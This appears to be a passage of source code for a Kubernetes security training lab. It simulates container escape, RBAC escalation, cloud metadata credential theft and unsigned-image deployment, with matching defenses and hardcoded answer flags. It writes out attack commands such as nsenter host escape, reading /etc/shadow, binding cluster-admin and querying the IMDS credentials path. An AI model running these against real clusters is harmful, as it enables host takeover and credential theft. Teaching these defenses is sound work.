#!/usr/bin/env python3
"""Lab 17: Kubernetes & Cloud Native Security Lab (KubeShield).

Interactive simulation of Kubernetes & Cloud Native attack surface & defense:
1. Stage 1: Container Breakout & Host Filesystem Escape (Privileged Pod & /host mount / nsenter)
2. Stage 2: Overprivileged RBAC & Cluster-Admin Escalation (Mounted SA Token & Wildcard Role)
3. Stage 3: IMDSv1 Cloud Credential Harvesting & Egress Hardening (SSRF vs IMDSv2 / NetworkPolicy)
4. Stage 4: Admission Controller Webhook Bypass & Cosign Image Signing Verification
"""

import json
import os
import re
import shlex
import time
from typing import Any, Dict, List, Optional

from fastapi import FastAPI, HTTPException, Request
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel

app = FastAPI(title="KubeShield - Kubernetes & Cloud Native Security Lab")

STATIC_DIR = os.path.join(os.path.dirname(__file__), "static")
os.makedirs(STATIC_DIR, exist_ok=True)
app.mount("/static", StaticFiles(directory=STATIC_DIR), name="static")

FLAGS = {
    "stage1": "FLAG{k8s_c0nt41n3r_3sc4p3_h0st_9182}",
    "stage2": "FLAG{k8s_rb4c_clvst3r_4dm1n_pwn_4821}",
    "stage3": "FLAG{k8s_1mdsv2_m3t4d4t4_sh13ld_6394}",
    "stage4": "FLAG{k8s_4dm1ss10n_c0s1gn_v3r1fy_2048}",
}


class KubeLabState:
    def __init__(self):
        self.reset()

    def reset(self):
        self.cluster_name = "k8s-production-cluster"
        self.k8s_version = "v1.28.4"
        self.nodes = [
            {"name": "cp-node-01", "role": "control-plane", "status": "Ready", "ip": "192.168.10.10", "os": "Ubuntu 22.04 LTS"},
            {"name": "worker-node-01", "role": "worker", "status": "Ready", "ip": "192.168.10.21", "os": "Ubuntu 22.04 LTS"},
            {"name": "worker-node-02", "role": "worker", "status": "Ready", "ip": "192.168.10.22", "os": "Ubuntu 22.04 LTS"},
        ]

        # Stage 1: Container Breakout
        self.stage1_pod = {
            "name": "web-frontend-pod-89dfc",
            "namespace": "default",
            "node": "worker-node-01",
            "privileged": True,
            "hostPID": True,
            "hostPath_mounted": "/host",
            "target_host_file": "/host/etc/shadow",
            "status": "Running",
        }
        self.psa_enforced = False  # Pod Security Standards (enforce: restricted)
        self.stage1_solved = False

        # Stage 2: RBAC Misconfiguration
        self.service_account = "app-operator-sa"
        self.sa_token_mounted = True
        self.rbac_cluster_role = "wildcard-dev-operator"
        self.rbac_rules = [
            {"apiGroups": ["*"], "resources": ["*"], "verbs": ["*"]}
        ]
        self.cluster_admin_bound = False
        self.stage2_solved = False

        # Stage 3: IMDS Cloud Metadata
        self.imds_version = "v1"
        self.imds_v1_enabled = True
        self.imds_v2_required = False
        self.imds_hop_limit = 2
        self.egress_policy_blocking = False
        self.node_iam_role = "k8s-node-worker-instance-profile"
        self.cloud_credentials = {
            "AccessKeyId": "ASIAVIBEHACKING9182",
            "SecretAccessKey": "k8s+SuperSecretCloudSessionKey+9941",
            "Token": "FwoGZXIvYXdzEJr//////////wEaDF...",
            "Expiration": "2026-09-18T18:00:00Z",
            "RoleArn": "arn:aws:iam::123456789012:role/k8s-node-worker-instance-profile",
        }
        self.stage3_solved = False

        # Stage 4: Supply Chain & Admission Webhook
        self.cosign_enforced = False
        self.deployed_images = [
            {"image": "nginx:1.25-alpine", "status": "Running", "signed": True},
            {"image": "redis:7.2", "status": "Running", "signed": True},
        ]
        self.stage4_solved = False

        self.solved_stages = set()


state = KubeLabState()


class CommandRequest(BaseModel):
    command: str


class FlagSubmission(BaseModel):
    flag: str


class PSAConfigureRequest(BaseModel):
    mode: str = "restricted"  # privileged, baseline, restricted


class ImageDeployRequest(BaseModel):
    image_url: str
    namespace: Optional[str] = "default"


@app.get("/status")
def get_status():
    return {
        "status": "online",
        "lab": "Lab 17 - Kubernetes & Cloud Native Security (KubeShield)",
        "cluster_name": state.cluster_name,
        "k8s_version": state.k8s_version,
        "total_stages": 4,
        "stages": {
            "stage1_container_escape": state.stage1_solved,
            "stage2_rbac_escalation": state.stage2_solved,
            "stage3_cloud_imds": state.stage3_solved,
            "stage4_admission_cosign": state.stage4_solved,
        },
        "solved_count": len(state.solved_stages),
        "defenses": {
            "psa_enforced": state.psa_enforced,
            "sa_token_mounted": state.sa_token_mounted,
            "imds_v2_required": state.imds_v2_required,
            "egress_policy_blocking": state.egress_policy_blocking,
            "cosign_enforced": state.cosign_enforced,
        },
    }


@app.post("/api/stage1/escape-container")
def stage1_escape_container():
    """Simulate container breakout via privileged pod /host mount and hostPID nsenter."""
    if state.psa_enforced:
        raise HTTPException(
            status_code=403,
            detail="Pod Security Admission (PSA) [enforce: restricted] 가 적용되어 특권 컨테이너 탈출이 차단되었습니다."
        )

    state.stage1_solved = True
    state.solved_stages.add("stage1")
    return {
        "success": True,
        "flag": FLAGS["stage1"],
        "method": "nsenter -t 1 -m -u -i -n -p /bin/sh & /host/etc/shadow read",
        "host_compromise": {
            "node": state.stage1_pod["node"],
            "leaked_host_root_hash": "root:$6$v1b3h4ck$9XyZ42w...:19240:0:99999:7:::",
            "host_kernel": "Linux worker-node-01 5.15.0-89-generic #99-Ubuntu SMP x86_64",
            "pod_spec": state.stage1_pod,
        },
        "message": "특권 컨테이너(/host 바운드 및 hostPID)를 통해 호스트 노드 네임스페이스 탈출에 성공했습니다!",
    }


@app.post("/api/stage1/apply-psa")
def stage1_apply_psa(req: PSAConfigureRequest):
    """Apply Pod Security Admission policy (restricted/baseline/privileged)."""
    if req.mode == "restricted":
        state.psa_enforced = True
        state.stage1_pod["privileged"] = False
        return {
            "success": True,
            "mode": req.mode,
            "message": "네임스페이스 default에 pod-security.kubernetes.io/enforce=restricted 가 적용되어 특권 파드가 비활성화되었습니다.",
        }
    else:
        state.psa_enforced = False
        state.stage1_pod["privileged"] = True
        return {
            "success": True,
            "mode": req.mode,
            "message": f"네임스페이스 default가 {req.mode} 모드로 변경되었습니다 (특권 파드 허용).",
        }


@app.post("/api/stage2/enumerate-rbac")
def stage2_enumerate_rbac():
    """Inspect mounted ServiceAccount token and permissions."""
    return {
        "service_account": state.service_account,
        "token_mounted": state.sa_token_mounted,
        "token_path": "/var/run/secrets/kubernetes.io/serviceaccount/token",
        "cluster_role": state.rbac_cluster_role,
        "rules": state.rbac_rules,
        "cluster_admin_bound": state.cluster_admin_bound,
    }


@app.post("/api/stage2/escalate-cluster-admin")
def stage2_escalate_cluster_admin():
    """Abuse wildcard ClusterRole to create ClusterRoleBinding for cluster-admin."""
    if not state.sa_token_mounted or state.rbac_cluster_role != "wildcard-dev-operator":
        raise HTTPException(
            status_code=403,
            detail="ServiceAccount 토큰이 마운트 해제되었거나 RBAC 와일드카드 권한이 제거되어 권한 상승이 불가능합니다."
        )

    state.cluster_admin_bound = True
    state.stage2_solved = True
    state.solved_stages.add("stage2")
    return {
        "success": True,
        "flag": FLAGS["stage2"],
        "cluster_role_binding": {
            "name": "pwned-cluster-admin-binding",
            "roleRef": "cluster-admin",
            "subject": f"system:serviceaccount:default:{state.service_account}",
        },
        "message": "와일드카드('*') RBAC 권한을 악용하여 cluster-admin RoleBinding을 생성하고 클러스터 최고 권한을 탈취했습니다!",
    }


@app.post("/api/stage2/remediate-rbac")
def stage2_remediate_rbac():
    """Remediate RBAC overprivilege and disable automountServiceAccountToken."""
    state.sa_token_mounted = False
    state.rbac_cluster_role = "least-privilege-reader"
    state.rbac_rules = [{"apiGroups": [""], "resources": ["pods"], "verbs": ["get", "list"]}]
    state.cluster_admin_bound = False
    return {
        "success": True,
        "message": "automountServiceAccountToken: false 적용 및 RBAC 권한을 최소 권한(pods get/list)으로 축소했습니다.",
    }


@app.post("/api/stage3/query-imds")
def stage3_query_imds():
    """Simulate Pod querying AWS/Cloud Instance Metadata Service (169.254.169.254)."""
    if state.egress_policy_blocking:
        raise HTTPException(
            status_code=408,
            detail="NetworkPolicy Egress 규칙에 의해 메타데이터 엔드포인트(169.254.169.254/32) 접속이 차단되었습니다 (Connection Timed Out)."
        )
    if state.imds_v2_required:
        raise HTTPException(
            status_code=403,
            detail="IMDSv2가 강제 적용되었습니다 (X-aws-ec2-metadata-token 헤더 누락 및 Hop Limit 1로 컨테이너 패킷 폐기)."
        )

    state.stage3_solved = True
    state.solved_stages.add("stage3")
    return {
        "success": True,
        "flag": FLAGS["stage3"],
        "imds_target": "http://169.254.169.254/latest/meta-data/iam/security-credentials/" + state.node_iam_role,
        "credentials": state.cloud_credentials,
        "message": "취약한 IMDSv1(Hop Limit=2, 인증 토큰 미요구)을 악용하여 클라우드 노드 인스턴스 IAM 임시 자격증명을 탈취했습니다!",
    }


@app.post("/api/stage3/enforce-imdsv2")
def stage3_enforce_imdsv2():
    """Enforce IMDSv2 (Hop Limit=1) and apply NetworkPolicy egress deny."""
    state.imds_v2_required = True
    state.imds_v1_enabled = False
    state.imds_hop_limit = 1
    state.egress_policy_blocking = True
    return {
        "success": True,
        "imds_version": "v2",
        "hop_limit": 1,
        "network_policy": "cilium/calico egress deny cidr: 169.254.169.254/32",
        "message": "IMDSv2 강제 적용(Hop Limit=1) 및 169.254.169.254 Egress 차단 NetworkPolicy가 적용되었습니다.",
    }


@app.post("/api/stage4/deploy-untrusted-image")
def stage4_deploy_untrusted_image(req: ImageDeployRequest):
    """Deploy pod with arbitrary container image."""
    if state.cosign_enforced:
        raise HTTPException(
            status_code=400,
            detail=f"ValidatingWebhook (Kyverno/Cosign) 검증 실패: 서명되지 않은 이미지 '{req.image_url}' 배포가 거부되었습니다 (admission webhook denied)."
        )

    new_pod = {
        "image": req.image_url,
        "status": "Running (Backdoor Injected)",
        "signed": False,
    }
    state.deployed_images.append(new_pod)
    state.stage4_solved = True
    state.solved_stages.add("stage4")
    return {
        "success": True,
        "flag": FLAGS["stage4"],
        "deployed_image": new_pod,
        "message": "서명 검증 없는 취약한 어드미션 상태를 악용하여 악성 백도어 이미지 배포에 성공했습니다!",
    }


@app.post("/api/stage4/enable-cosign-webhook")
def stage4_enable_cosign_webhook():
    """Enable Kyverno/Gatekeeper ValidatingWebhook with Sigstore/Cosign signature verification."""
    state.cosign_enforced = True
    return {
        "success": True,
        "webhook_policy": "ClusterPolicy: verify-image-signatures (Sigstore/Cosign)",
        "failurePolicy": "Fail",
        "message": "Kyverno 어드미션 웹훅이 활성화되어 Cosign 서명이 없는 모든 이미지 배포가 강제 차단됩니다.",
    }


@app.post("/api/terminal")
def terminal_command(req: CommandRequest):
    """Simulated interactive bash/kubectl terminal."""
    cmd = req.command.strip()
    if not cmd:
        return {"output": ""}

    if cmd == "help":
        output = """KubeShield CLI 가상 터미널 지원 명령어:
  help                                  - 사용 가능한 명령어 목록 출력
  status                                - 클러스터 보안 상태 및 랩 진행도 확인
  kubectl get nodes                     - 클러스터 노드 목록 출력
  kubectl get pods -A                   - 전체 네임스페이스 파드 목록 출력
  kubectl auth can-i --list             - 현재 ServiceAccount 권한 매트릭스 조회
  kubectl describe clusterrole          - ClusterRole 바인딩 및 규칙 조회
  kubectl apply -f psa-restricted.yaml  - Pod Security Standards restricted 적용
  kubectl apply -f rbac-fix.yaml        - 최소 권한 RBAC 적용
  curl http://169.254.169.254/...       - 메타데이터(IMDS) 엔드포인트 쿼리
  cosign verify <image>                 - 컨테이너 이미지 서명 검증
  flags                                 - 획득한 플래그 목록 확인
  reset                                 - 랩 상태 초기화"""
        return {"output": output}

    if cmd == "status":
        return {
            "output": f"""[+] Cluster: {state.cluster_name} ({state.k8s_version})
[+] Pods: {len(state.deployed_images) + 1} | Nodes: {len(state.nodes)}
[+] PSA Enforced: {state.psa_enforced}
[+] Overprivileged RBAC: {state.rbac_cluster_role == 'wildcard-dev-operator'}
[+] IMDSv2 Enforced: {state.imds_v2_required} (Egress Deny: {state.egress_policy_blocking})
[+] Cosign Signature Webhook: {state.cosign_enforced}
[+] Solved Stages: {len(state.solved_stages)} / 4"""
        }

    if cmd == "flags":
        found = [f"  [{k}] {FLAGS[k]}" for k in state.solved_stages]
        if not found:
            return {"output": "아직 획득한 플래그가 없습니다. 각 단계를 공략해 플래그를 획득하세요!"}
        return {"output": "획득한 플래그:\n" + "\n".join(found)}

    if cmd == "reset":
        state.reset()
        return {"output": "KubeShield 랩 상태가 초기화되었습니다."}

    if cmd.startswith("kubectl get nodes"):
        lines = ["NAME             STATUS   ROLES           AGE   VERSION   INTERNAL-IP",
                 "cp-node-01       Ready    control-plane   42d   v1.28.4   192.168.10.10",
                 "worker-node-01   Ready    worker          42d   v1.28.4   192.168.10.21",
                 "worker-node-02   Ready    worker          42d   v1.28.4   192.168.10.22"]
        return {"output": "\n".join(lines)}

    if cmd.startswith("kubectl get pods"):
        lines = [
            "NAMESPACE     NAME                               READY   STATUS    RESTARTS   AGE",
            "kube-system   kube-apiserver-cp-node-01          1/1     Running   0          42d",
            "kube-system   etcd-cp-node-01                    1/1     Running   0          42d",
            "kube-system   coredns-5dd5756b68-q84pl           1/1     Running   0          42d",
            f"default       {state.stage1_pod['name']}   1/1     Running   0          12h",
        ]
        for idx, img in enumerate(state.deployed_images):
            lines.append(f"default       workload-{idx}-7f98d                 1/1     {img['status']}   0          2h")
        return {"output": "\n".join(lines)}

    if cmd.startswith("kubectl auth can-i --list"):
        if state.sa_token_mounted and state.rbac_cluster_role == "wildcard-dev-operator":
            return {
                "output": """Resources   Non-Resource URLs   Resource Names   Verbs
*.*         []                  []               [*]
*           []                  []               [*]
pods/exec   []                  []               [create]"""
            }
        else:
            return {
                "output": """Resources   Non-Resource URLs   Resource Names   Verbs
pods        []                  []               [get, list]"""
            }

    if "169.254.169.254" in cmd:
        if state.egress_policy_blocking:
            return {"output": "curl: (28) Failed to connect to 169.254.169.254 port 80: Connection timed out"}
        if state.imds_v2_required:
            return {"output": "HTTP/1.1 401 Unauthorized\nContent-Type: text/plain\n\nToken is required for IMDSv2."}
        return {
            "output": f"""HTTP/1.1 200 OK
Content-Type: application/json

{{
  "Code": "Success",
  "LastUpdated": "2026-09-18T12:00:00Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "{state.cloud_credentials['AccessKeyId']}",
  "SecretAccessKey": "{state.cloud_credentials['SecretAccessKey']}",
  "Token": "{state.cloud_credentials['Token']}",
  "Expiration": "{state.cloud_credentials['Expiration']}"
}}"""
        }

    if cmd.startswith("cosign verify"):
        if "backdoor" in cmd:
            if state.cosign_enforced:
                return {"output": "Error: no signatures found for image: registry.malicious.io/supplychain/backdoor:v1"}
            else:
                return {"output": "Warning: image verification skipped (Cosign admission webhook is disabled)."}
        return {"output": "Verification for image was successful! Digest: sha256:4b93198..."}

    if cmd.startswith("kubectl apply -f psa-restricted.yaml"):
        state.psa_enforced = True
        return {"output": "namespace/default configured (pod-security.kubernetes.io/enforce: restricted)"}

    if cmd.startswith("kubectl apply -f rbac-fix.yaml"):
        state.sa_token_mounted = False
        state.rbac_cluster_role = "least-privilege-reader"
        return {"output": "clusterrole.rbac.authorization.k8s.io/wildcard-dev-operator replaced with least-privilege-reader"}

    return {"output": f"bash: {cmd}: 명령을 찾을 수 없습니다. 'help'를 입력하여 도움말을 확인하세요."}


@app.post("/api/submit-flag")
def submit_flag(req: FlagSubmission):
    candidate = req.flag.strip()
    for stage_key, val in FLAGS.items():
        if candidate == val:
            state.solved_stages.add(stage_key)
            return {
                "success": True,
                "stage": stage_key,
                "message": f"🎉 축하합니다! {stage_key} 플래그가 확인되었습니다.",
                "total_solved": len(state.solved_stages),
            }
    return {
        "success": False,
        "message": "❌ 올바르지 않은 플래그입니다. 다시 확인해보세요.",
        "total_solved": len(state.solved_stages),
    }


@app.post("/api/reset")
def reset_lab():
    state.reset()
    return {"success": True, "message": "KubeShield 랩이 초기 상태로 리셋되었습니다."}


@app.get("/", response_class=HTMLResponse)
def index_page():
    html_content = """<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Lab 17: KubeShield - Kubernetes & Cloud Native Security Lab</title>
  <style>
    :root {
      --bg-primary: #0d1117;
      --bg-secondary: #161b22;
      --bg-card: #21262d;
      --text-main: #c9d1d9;
      --text-muted: #8b949e;
      --accent: #58a6ff;
      --accent-cyan: #39c5bb;
      --accent-k8s: #326ce5;
      --success: #3fb950;
      --warning: #d29922;
      --danger: #f85149;
      --border: #30363d;
    }
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      background-color: var(--bg-primary);
      color: var(--text-main);
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
      line-height: 1.5;
      padding: 20px;
    }
    header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 16px 24px;
      background: var(--bg-secondary);
      border: 1px solid var(--border);
      border-radius: 8px;
      margin-bottom: 20px;
    }
    .brand {
      display: flex;
      align-items: center;
      gap: 12px;
    }
    .brand h1 {
      font-size: 1.4rem;
      color: #fff;
      font-weight: 700;
    }
    .brand span {
      background: var(--accent-k8s);
      color: #fff;
      font-size: 0.75rem;
      padding: 3px 8px;
      border-radius: 12px;
      font-weight: 600;
    }
    .hud {
      display: flex;
      gap: 16px;
      align-items: center;
    }
    .hud-badge {
      background: var(--bg-card);
      border: 1px solid var(--border);
      padding: 6px 14px;
      border-radius: 6px;
      font-size: 0.85rem;
    }
    .hud-badge b { color: var(--accent); }
    .btn {
      background: var(--accent);
      color: #0d1117;
      border: none;
      padding: 8px 14px;
      border-radius: 6px;
      font-weight: 600;
      cursor: pointer;
      font-size: 0.85rem;
      transition: all 0.2s ease;
    }
    .btn:hover { opacity: 0.9; transform: translateY(-1px); }
    .btn-danger { background: var(--danger); color: #fff; }
    .btn-success { background: var(--success); color: #fff; }
    .btn-secondary { background: var(--bg-card); color: var(--text-main); border: 1px solid var(--border); }
    .container {
      display: grid;
      grid-template-columns: 2fr 1fr;
      gap: 20px;
    }
    @media (max-width: 1024px) {
      .container { grid-template-columns: 1fr; }
    }
    .card {
      background: var(--bg-secondary);
      border: 1px solid var(--border);
      border-radius: 8px;
      padding: 20px;
      margin-bottom: 20px;
    }
    .card h2 {
      font-size: 1.15rem;
      color: #fff;
      margin-bottom: 12px;
      display: flex;
      align-items: center;
      gap: 8px;
    }
    .stage-item {
      background: var(--bg-card);
      border: 1px solid var(--border);
      border-radius: 6px;
      padding: 16px;
      margin-bottom: 14px;
      transition: border-color 0.2s ease;
    }
    .stage-item.solved {
      border-color: var(--success);
      background: rgba(63, 185, 80, 0.05);
    }
    .stage-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 8px;
    }
    .stage-title {
      font-weight: 600;
      color: #fff;
    }
    .stage-desc {
      font-size: 0.85rem;
      color: var(--text-muted);
      margin-bottom: 12px;
    }
    .actions-bar {
      display: flex;
      gap: 8px;
      flex-wrap: wrap;
      margin-top: 10px;
    }
    .terminal-box {
      background: #000;
      border: 1px solid var(--border);
      border-radius: 6px;
      padding: 12px;
      font-family: "SFMono-Regular", Consolas, "Liberation Mono", Menlo, monospace;
      font-size: 0.82rem;
      height: 360px;
      overflow-y: auto;
      color: #39c5bb;
      margin-bottom: 10px;
      white-space: pre-wrap;
    }
    .terminal-input-bar {
      display: flex;
      gap: 8px;
    }
    .terminal-input {
      flex: 1;
      background: #000;
      border: 1px solid var(--border);
      border-radius: 6px;
      color: #fff;
      padding: 8px 12px;
      font-family: monospace;
      font-size: 0.85rem;
    }
    .terminal-input:focus { outline: none; border-color: var(--accent); }
    .flag-card input {
      width: 100%;
      background: var(--bg-card);
      border: 1px solid var(--border);
      border-radius: 6px;
      padding: 10px 12px;
      color: #fff;
      font-family: monospace;
      font-size: 0.9rem;
      margin-bottom: 10px;
    }
    .flag-result {
      padding: 10px;
      border-radius: 6px;
      font-size: 0.85rem;
      margin-top: 10px;
      display: none;
    }
    .flag-result.success { background: rgba(63, 185, 80, 0.15); color: var(--success); border: 1px solid var(--success); display: block; }
    .flag-result.error { background: rgba(248, 81, 73, 0.15); color: var(--danger); border: 1px solid var(--danger); display: block; }
    pre.code-snippet {
      background: #000;
      padding: 8px 12px;
      border-radius: 4px;
      font-size: 0.78rem;
      color: #e6edf3;
      overflow-x: auto;
      margin: 6px 0;
    }
  </style>
</head>
<body>

  <header>
    <div class="brand">
      <h1>☸️ KubeShield</h1>
      <span>Lab 17</span>
      <span style="background:#238636;">Kubernetes Security</span>
    </div>
    <div class="hud">
      <div class="hud-badge">진행도: <b id="solvedCount">0 / 4</b></div>
      <button class="btn btn-secondary" onclick="resetLab()">초기화 (Reset)</button>
    </div>
  </header>

  <div class="container">
    <div>
      <div class="card">
        <h2>🎯 4대 공격 및 방어 시나리오</h2>

        <!-- Stage 1 -->
        <div class="stage-item" id="stage1Box">
          <div class="stage-header">
            <span class="stage-title">1단계: 특권 컨테이너 탈출 (Container Breakout & Host Escape)</span>
            <span id="badge1" style="color:var(--text-muted); font-size:0.8rem;">미완료</span>
          </div>
          <div class="stage-desc">
            <code>privileged: true</code> 및 <code>hostPath: /host</code> 볼륨이 마운트된 파드에서 호스트 OS 네임스페이스로 탈출하여 <code>/host/etc/shadow</code>를 적출합니다.
          </div>
          <div class="actions-bar">
            <button class="btn btn-danger" onclick="escapeContainer()">탈출 공격 실행 (Container Escape)</button>
            <button class="btn btn-secondary" onclick="applyPSA('restricted')">방어: PSA Restricted 적용</button>
            <button class="btn btn-secondary" onclick="applyPSA('privileged')">초기화: Privileged 허용</button>
          </div>
        </div>

        <!-- Stage 2 -->
        <div class="stage-item" id="stage2Box">
          <div class="stage-header">
            <span class="stage-title">2단계: 과도한 RBAC 권한 상승 (ServiceAccount Wildcard Abuse)</span>
            <span id="badge2" style="color:var(--text-muted); font-size:0.8rem;">미완료</span>
          </div>
          <div class="stage-desc">
            파드 내 자동 마운트된 ServiceAccount 토큰이 <code>*.* / [*]</code> 와일드카드 ClusterRole을 가집니다. 이를 악용해 <code>cluster-admin</code>을 바인딩합니다.
          </div>
          <div class="actions-bar">
            <button class="btn btn-secondary" onclick="enumerateRBAC()">토큰 및 권한 매트릭스 점검</button>
            <button class="btn btn-danger" onclick="escalateRBAC()">권한 상승 공격 (Escalate to Cluster-Admin)</button>
            <button class="btn btn-success" onclick="remediateRBAC()">방어: SA 토큰 마운트 차단 & 최소 권한 적용</button>
          </div>
        </div>

        <!-- Stage 3 -->
        <div class="stage-item" id="stage3Box">
          <div class="stage-header">
            <span class="stage-title">3단계: 클라우드 IMDS 탈취 및 SSRF 방어 (Cloud Metadata Egress)</span>
            <span id="badge3" style="color:var(--text-muted); font-size:0.8rem;">미완료</span>
          </div>
          <div class="stage-desc">
            파드에서 AWS 인스턴스 메타데이터(169.254.169.254) 엔드포인트에 쿼리하여 노드 IAM 역할을 탈취합니다. IMDSv2와 Egress 차단 NetworkPolicy로 방어합니다.
          </div>
          <div class="actions-bar">
            <button class="btn btn-danger" onclick="queryIMDS()">IMDSv1 메타데이터 탈취 (SSRF)</button>
            <button class="btn btn-success" onclick="enforceIMDSv2()">방어: IMDSv2 강제 및 Egress 차단</button>
          </div>
        </div>

        <!-- Stage 4 -->
        <div class="stage-item" id="stage4Box">
          <div class="stage-header">
            <span class="stage-title">4단계: 공급망 위조 이미지 침투 & Cosign 어드미션 제어</span>
            <span id="badge4" style="color:var(--text-muted); font-size:0.8rem;">미완료</span>
          </div>
          <div class="stage-desc">
            서명 검증이 없는 클러스터에 위조된 백도어 이미지 <code>registry.malicious.io/supplychain/backdoor:v1</code>를 배포합니다. Kyverno/Cosign 서명 검증 웹훅을 가동해 방어합니다.
          </div>
          <div class="actions-bar">
            <button class="btn btn-danger" onclick="deployUntrusted()">악성 백도어 이미지 배포 (Supply Chain Attack)</button>
            <button class="btn btn-success" onclick="enableCosign()">방어: Cosign 서명 검증 Webhook 강제</button>
          </div>
        </div>

      </div>
    </div>

    <div>
      <!-- Terminal Window -->
      <div class="card">
        <h2>💻 KubeShield 터미널</h2>
        <div class="terminal-box" id="termOutput">KubeShield Kubernetes Security Terminal v1.28.4
도움말이 필요하시면 'help' 또는 'status'를 입력하세요.

$ kubectl get nodes
NAME             STATUS   ROLES           AGE   VERSION   INTERNAL-IP
cp-node-01       Ready    control-plane   42d   v1.28.4   192.168.10.10
worker-node-01   Ready    worker          42d   v1.28.4   192.168.10.21
worker-node-02   Ready    worker          42d   v1.28.4   192.168.10.22
</div>
        <div class="terminal-input-bar">
          <input type="text" class="terminal-input" id="termInput" placeholder="kubectl get pods -A, curl ..., flags, help" onkeydown="handleTermKey(event)">
          <button class="btn" onclick="sendTermCmd()">실행</button>
        </div>
      </div>

      <!-- Flag Submission -->
      <div class="card flag-card">
        <h2>🚩 플래그 제출 (Flag Submission)</h2>
        <input type="text" id="flagInput" placeholder="FLAG{...}">
        <button class="btn btn-success" style="width:100%;" onclick="submitFlag()">플래그 검증 (Submit)</button>
        <div class="flag-result" id="flagResult"></div>
      </div>
    </div>
  </div>

  <script>
    async function updateStatus() {
      try {
        const res = await fetch('/status');
        const data = await res.json();
        document.getElementById('solvedCount').innerText = `${data.solved_count} / 4`;
        
        if (data.stages.stage1_container_escape) {
          document.getElementById('stage1Box').classList.add('solved');
          document.getElementById('badge1').innerText = '✅ 완료';
          document.getElementById('badge1').style.color = 'var(--success)';
        } else {
          document.getElementById('stage1Box').classList.remove('solved');
          document.getElementById('badge1').innerText = '미완료';
          document.getElementById('badge1').style.color = 'var(--text-muted)';
        }

        if (data.stages.stage2_rbac_escalation) {
          document.getElementById('stage2Box').classList.add('solved');
          document.getElementById('badge2').innerText = '✅ 완료';
          document.getElementById('badge2').style.color = 'var(--success)';
        } else {
          document.getElementById('stage2Box').classList.remove('solved');
          document.getElementById('badge2').innerText = '미완료';
          document.getElementById('badge2').style.color = 'var(--text-muted)';
        }

        if (data.stages.stage3_cloud_imds) {
          document.getElementById('stage3Box').classList.add('solved');
          document.getElementById('badge3').innerText = '✅ 완료';
          document.getElementById('badge3').style.color = 'var(--success)';
        } else {
          document.getElementById('stage3Box').classList.remove('solved');
          document.getElementById('badge3').innerText = '미완료';
          document.getElementById('badge3').style.color = 'var(--text-muted)';
        }

        if (data.stages.stage4_admission_cosign) {
          document.getElementById('stage4Box').classList.add('solved');
          document.getElementById('badge4').innerText = '✅ 완료';
          document.getElementById('badge4').style.color = 'var(--success)';
        } else {
          document.getElementById('stage4Box').classList.remove('solved');
          document.getElementById('badge4').innerText = '미완료';
          document.getElementById('badge4').style.color = 'var(--text-muted)';
        }
      } catch (err) {
        console.error(err);
      }
    }

    function appendTerm(cmd, output) {
      const box = document.getElementById('termOutput');
      box.innerText += `\n$ ${cmd}\n${output}`;
      box.scrollTop = box.scrollHeight;
    }

    async function sendTermCmd() {
      const input = document.getElementById('termInput');
      const cmd = input.value.trim();
      if (!cmd) return;
      input.value = '';
      try {
        const res = await fetch('/api/terminal', {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({command: cmd})
        });
        const data = await res.json();
        appendTerm(cmd, data.output);
      } catch (err) {
        appendTerm(cmd, "Error: " + err.message);
      }
    }

    function handleTermKey(e) {
      if (e.key === 'Enter') sendTermCmd();
    }

    async function escapeContainer() {
      try {
        const res = await fetch('/api/stage1/escape-container', {method: 'POST'});
        const data = await res.json();
        if (res.ok) {
          appendTerm("nsenter -t 1 -m -u -i -n -p /bin/sh", `[+] HOST ESCAPE SUCCESSFUL!\n[+] Leaked Hash: ${data.host_compromise.leaked_host_root_hash}\n[+] FLAG: ${data.flag}`);
          alert(`[Stage 1 성공!] 호스트 탈출 완료!\n플래그: ${data.flag}`);
          updateStatus();
        } else {
          appendTerm("nsenter -t 1 -m -u -i -n -p /bin/sh", `[-] FAIL: ${data.detail}`);
          alert(`[실패] ${data.detail}`);
        }
      } catch (e) { alert(e.message); }
    }

    async function applyPSA(mode) {
      const res = await fetch('/api/stage1/apply-psa', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({mode: mode})
      });
      const data = await res.json();
      appendTerm(`kubectl label --overwrite ns default pod-security.kubernetes.io/enforce=${mode}`, data.message);
      alert(data.message);
    }

    async function enumerateRBAC() {
      const res = await fetch('/api/stage2/enumerate-rbac', {method: 'POST'});
      const data = await res.json();
      appendTerm("kubectl auth can-i --list", `ServiceAccount: ${data.service_account}\nClusterRole: ${data.cluster_role}\nRules: ${JSON.stringify(data.rules, null, 2)}`);
    }

    async function escalateRBAC() {
      try {
        const res = await fetch('/api/stage2/escalate-cluster-admin', {method: 'POST'});
        const data = await res.json();
        if (res.ok) {
          appendTerm("kubectl create clusterrolebinding pwned --clusterrole=cluster-admin --serviceaccount=default:app-operator-sa", `[+] PRIVILEGE ESCALATION SUCCESSFUL!\n[+] Bound: cluster-admin\n[+] FLAG: ${data.flag}`);
          alert(`[Stage 2 성공!] cluster-admin 권한 획득!\n플래그: ${data.flag}`);
          updateStatus();
        } else {
          appendTerm("kubectl create clusterrolebinding ...", `[-] FAIL: ${data.detail}`);
          alert(`[실패] ${data.detail}`);
        }
      } catch (e) { alert(e.message); }
    }

    async function remediateRBAC() {
      const res = await fetch('/api/stage2/remediate-rbac', {method: 'POST'});
      const data = await res.json();
      appendTerm("kubectl apply -f rbac-least-privilege.yaml", data.message);
      alert(data.message);
    }

    async function queryIMDS() {
      try {
        const res = await fetch('/api/stage3/query-imds', {method: 'POST'});
        const data = await res.json();
        if (res.ok) {
          appendTerm("curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/...", `[+] CREDENTIAL HARVEST SUCCESSFUL!\n[+] Key: ${data.credentials.AccessKeyId}\n[+] FLAG: ${data.flag}`);
          alert(`[Stage 3 성공!] Cloud IAM 자격증명 탈취 완료!\n플래그: ${data.flag}`);
          updateStatus();
        } else {
